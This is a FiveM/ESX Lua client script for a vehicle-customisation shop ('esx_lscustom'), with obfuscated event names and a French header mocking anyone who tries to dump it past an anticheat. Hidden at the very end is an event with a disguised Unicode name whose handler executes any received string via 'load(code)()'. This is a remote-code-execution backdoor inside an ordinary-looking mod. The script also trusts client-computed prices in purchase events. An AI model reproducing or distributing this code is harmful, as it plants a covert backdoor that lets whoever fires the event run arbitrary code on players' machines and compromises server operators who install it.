-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

local Vehicles = {}
local lsMenuIsShowed = false
local isInLSMarker = false
local myCar = {}
local isBuying

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
  	PlayerData = xPlayer
	ESX.TriggerServerCallback('::{korioz#0110}::esx_lscustom:getVehiclesPrices', function(vehicles)
		Vehicles = vehicles
	end)
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
end)

RegisterNetEvent('::{korioz#0110}::esx_lscustom:installMod')
AddEventHandler('::{korioz#0110}::esx_lscustom:installMod', function()
	myCar = ESX.Game.GetVehicleProperties(GetVehiclePedIsIn(PlayerPedId(), false))
	_TriggerServerEvent('::{korioz#0110}::esx_lscustom:refreshOwnedVehicle', myCar)
end)

RegisterNetEvent('::{korioz#0110}::esx_lscustom:cancelInstallMod')
AddEventHandler('::{korioz#0110}::esx_lscustom:cancelInstallMod', function()
	ESX.Game.SetVehicleProperties(GetVehiclePedIsIn(PlayerPedId(), false), myCar)
end)

function OpenLSMenu(elems, menuname, menutitle, parent)
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), menuname, {
		title = menutitle,
		elements = elems
	}, function(data, menu)
		local isRimMod = false

		if data.current.modType == "modFrontWheels" then
			isRimMod = true
		end

		local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
		local found = false

		for k, v in pairs(Config.Menus) do
			if k == data.current.modType or isRimMod then
				if data.current.label == _U('by_default') or string.match(data.current.rightlabel[1], _U('installed')) then
					ESX.ShowNotification(_U('already_own') .. data.current.label)
					TriggerEvent('::{korioz#0110}::esx_lscustom:installMod')
				else
					local vehiclePrice = 0
					for i = 1, #Vehicles, 1 do
						if GetEntityModel(vehicle) == GetHashKey(Vehicles[i].model) then
							vehiclePrice = Vehicles[i].price
							break
						end
					end

					if isRimMod then
						isBuying = true
						price = math.floor(vehiclePrice * data.current.price / 100)
						_TriggerServerEvent("::{korioz#0110}::esx_lscustom:buyMod", price)
					elseif v.modType == 11 or v.modType == 12 or v.modType == 13 or v.modType == 15 or v.modType == 16 or v.modType == 17 then
						isBuying = true
						price = math.floor(vehiclePrice * v.price[data.current.modNum + 1] / 100)
						_TriggerServerEvent("::{korioz#0110}::esx_lscustom:buyMod", price)
					else
						isBuying = true
						price = math.floor(vehiclePrice * v.price / 100)
						_TriggerServerEvent("::{korioz#0110}::esx_lscustom:buyMod", price)
					end
				end

				menu.close()
				found = true
				break
			end
		end

		if not found then
			GetAction(data.current)
		end
	end, function(data, menu)
		if isBuying == nil then
			TriggerEvent('::{korioz#0110}::esx_lscustom:cancelInstallMod')
		else
			isBuying = nil
		end

		SetVehicleDoorsShut(GetVehiclePedIsIn(PlayerPedId(), false), false)

		if parent == nil then
			lsMenuIsShowed = false
			FreezeEntityPosition(GetVehiclePedIsIn(PlayerPedId(), false), false)
			myCar = {}
		end
	end, function(data, menu)
		UpdateMods(data.current)
	end)
end

function UpdateMods(data)
	local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)

	if data.modType ~= nil then
		local props = {}

		if data.wheelType ~= nil then
			props['wheels'] = data.wheelType
			ESX.Game.SetVehicleProperties(vehicle, props)
			props = {}
		elseif data.modType == 'neonColor' then
			props['neonEnabled'] = {true, true, true, true}
			ESX.Game.SetVehicleProperties(vehicle, props)
			props = {}
		elseif data.modType == 'tyreSmokeColor' then
			props['modSmokeEnabled'] = true
			ESX.Game.SetVehicleProperties(vehicle, props)
			props = {}
		end

		props[data.modType] = data.modNum
		ESX.Game.SetVehicleProperties(vehicle, props)
	end
end

function GetAction(data)
	local elements = {}
	local menuname = ''
	local menutitle = ''
	local parent = nil

	local playerPed = PlayerPedId()
	local vehicle = GetVehiclePedIsIn(playerPed, false)
	local currentMods = ESX.Game.GetVehicleProperties(vehicle)

	if data.value == 'modSpeakers' or
		data.value == 'modTrunk' or
		data.value == 'modHydrolic' or
		data.value == 'modEngineBlock' or
		data.value == 'modAirFilter' or
		data.value == 'modStruts' or
		data.value == 'modTank' then
		SetVehicleDoorOpen(vehicle, 4, false)
		SetVehicleDoorOpen(vehicle, 5, false)
	elseif data.value == 'modDoorSpeaker' then
		SetVehicleDoorOpen(vehicle, 0, false)
		SetVehicleDoorOpen(vehicle, 1, false)
		SetVehicleDoorOpen(vehicle, 2, false)
		SetVehicleDoorOpen(vehicle, 3, false)
	else
		SetVehicleDoorsShut(vehicle, false)
	end

	local vehiclePrice = 0

	for i = 1, #Vehicles, 1 do
		if GetEntityModel(vehicle) == GetHashKey(Vehicles[i].model) then
			vehiclePrice = Vehicles[i].price
			break
		end
	end

	for k, v in pairs(Config.Menus) do
		if data.value == k then
			menuname = k
			menutitle = v.label
			parent = v.parent

			if v.modType ~= nil then
				if v.modType == 22 then
					table.insert(elements, {label = _U('by_default'), modType = k, modNum = false})
				elseif v.modType == 'color1' or v.modType == 'color2' or v.modType == 'pearlescentColor' or v.modType == 'wheelColor' then
					table.insert(elements, {label = _U('by_default'), modType = k, modNum = myCar[v.modType]})
				else
					table.insert(elements, {label = _U('by_default'), modType = k, modNum = -1})
				end

				if v.modType == 14 then
					for j = 0, 51, 1 do
						local _rightlabel = {''}

						if j == currentMods.modHorns then
							_rightlabel =  {_U('installed')}
						else
							price = math.floor(vehiclePrice * v.price / 100)
							_rightlabel = {'$' .. price}
						end

						table.insert(elements, {label = GetHornName(j), rightlabel = _rightlabel, modType = k, modNum = j})
					end
				elseif v.modType == 'plateIndex' then
					for j = 0, 4, 1 do
						local _rightlabel = {''}

						if j == currentMods.plateIndex then
							_rightlabel =  {_U('installed')}
						else
							price = math.floor(vehiclePrice * v.price / 100)
							_rightlabel = {'$' .. price}
						end

						table.insert(elements, {label = GetPlatesName(j), rightlabel = _rightlabel, modType = k, modNum = j})
					end
				elseif v.modType == 22 then
					local _rightlabel = {''}

					if currentMods.modXenon then
						_rightlabel = {_U('installed')}
					else
						price = math.floor(vehiclePrice * v.price / 100)
						_rightlabel = {'$' .. price}
					end

					table.insert(elements, {label = 'Xénon', rightlabel = _rightlabel, modType = k, modNum = true})
				elseif v.modType == 'neonColor' or v.modType == 'tyreSmokeColor' then
					local neons = GetNeons()
					price = math.floor(vehiclePrice * v.price / 100)

					for i = 1, #neons, 1 do
						table.insert(elements, {
							label = neons[i].label,
							rightlabel = {'$' .. price},
							modType = k,
							modNum = {neons[i].r, neons[i].g, neons[i].b}
						})
					end
				elseif v.modType == 'color1' or v.modType == 'color2' or v.modType == 'pearlescentColor' or v.modType == 'wheelColor' then -- RESPRAYS
					local colors = GetColors(data.color)

					for j = 1, #colors, 1 do
						price = math.floor(vehiclePrice * v.price / 100)
						table.insert(elements, {label = colors[j].label, rightlabel = {'$' .. price}, modType = k, modNum = colors[j].index})
					end
				elseif v.modType == 'windowTint' then -- WINDOWS TINT
					for j = 1, 5, 1 do
						local _rightlabel = {''}

						if j == currentMods.modHorns then
							_rightlabel = {_U('installed')}
						else
							price = math.floor(vehiclePrice * v.price / 100)
							_rightlabel = {'$' .. price}
						end

						table.insert(elements, {label = GetWindowName(j), rightlabel = _rightlabel, modType = k, modNum = j})
					end
				elseif v.modType == 23 then -- WHEELS RIM & TYPE
					local props = {}

					props['wheels'] = v.wheelType
					ESX.Game.SetVehicleProperties(vehicle, props)
					local modCount = GetNumVehicleMods(vehicle, v.modType)

					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(vehicle, v.modType, j)

						if modName ~= nil then
							local _rightlabel = {''}

							if j == currentMods.modFrontWheels then
								_rightlabel =  {_U('installed')}
							else
								price = math.floor(vehiclePrice * v.price / 100)
								_rightlabel = {'$' .. price}
							end

							table.insert(elements, {label = GetLabelText(modName), rightlabel = _rightlabel, modType = 'modFrontWheels', modNum = j, wheelType = v.wheelType, price = v.price})
						end
					end
				elseif v.modType == 11 or v.modType == 12 or v.modType == 13 or v.modType == 15 or v.modType == 16 or v.modType == 18 then
					local modCount = GetNumVehicleMods(vehicle, v.modType) -- UPGRADES

					for j = 0, modCount, 1 do
						local _rightlabel = {''}

						if j == currentMods[k] then
							_rightlabel = {'$' .. price}
						else
							price = math.floor(vehiclePrice * v.price[j + 1] / 100)
							_rightlabel = {'$' .. price}
						end

						table.insert(elements, {label = 'Niveau ' .. j + 1, rightlabel = _rightlabel, modType = k, modNum = j})

						if j == modCount-1 then
							break
						end
					end
				else
					local modCount = GetNumVehicleMods(vehicle, v.modType) -- BODYPARTS

					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(vehicle, v.modType, j)

						if modName ~= nil then
							local _rightlabel = {''}

							if j == currentMods[k] then
								_rightlabel = {_U('installed')}
							else
								price = math.floor(vehiclePrice * v.price / 100)
								_rightlabel = {'$' .. price}
							end

							table.insert(elements, {label = GetLabelText(modName), rightlabel = _rightlabel, modType = k, modNum = j})
						end
					end
				end
			else
				if data.value == 'primaryRespray' or data.value == 'secondaryRespray' or data.value == 'pearlescentRespray' or data.value == 'modFrontWheelsColor' then
					for i = 1, #Config.Colors, 1 do
						if data.value == 'primaryRespray' then
							table.insert(elements, {label = Config.Colors[i].label, value = 'color1', color = Config.Colors[i].value})
						elseif data.value == 'secondaryRespray' then
							table.insert(elements, {label = Config.Colors[i].label, value = 'color2', color = Config.Colors[i].value})
						elseif data.value == 'pearlescentRespray' then
							table.insert(elements, {label = Config.Colors[i].label, value = 'pearlescentColor', color = Config.Colors[i].value})
						elseif data.value == 'modFrontWheelsColor' then
							table.insert(elements, {label = Config.Colors[i].label, value = 'wheelColor', color = Config.Colors[i].value})
						end
					end
				else
					for k2, v2 in pairs(v) do
						if k2 ~= 'label' and k2 ~= 'parent' then
							table.insert(elements, {label = v2, value = k2})
						end
					end
				end
			end

			break
		end
	end

	table.sort(elements, function(a, b)
		return a.label < b.label
	end)

	OpenLSMenu(elements, menuname, menutitle, parent)
end

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed, false) then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local currentZone = nil
			local zone = nil
			local lastZone = nil

			if (PlayerData.job ~= nil and PlayerData.job.name == 'mecano') or not Config.IsMecanoJobOnly then
				for k, v in pairs(Config.Zones) do
					if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
						isInLSMarker = true
						SetTextComponentFormat("STRING")
						AddTextComponentSubstringPlayerName(v.Hint)
						EndTextCommandDisplayHelp(0, 0, 1, -1)
						break
					else
						isInLSMarker = false
					end
				end
			end

			if IsControlJustReleased(0, 38) and not lsMenuIsShowed and isInLSMarker then
				local vehicle = GetVehiclePedIsIn(playerPed, false)
				lsMenuIsShowed = true
				FreezeEntityPosition(vehicle, true)
				myCar = ESX.Game.GetVehicleProperties(vehicle)
				ESX.UI.Menu.CloseAll()
				GetAction({value = 'main'})
			end

			if isInLSMarker and not hasAlreadyEnteredMarker then
				hasAlreadyEnteredMarker = true
			end

			if not isInLSMarker and hasAlreadyEnteredMarker then
				hasAlreadyEnteredMarker = false
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)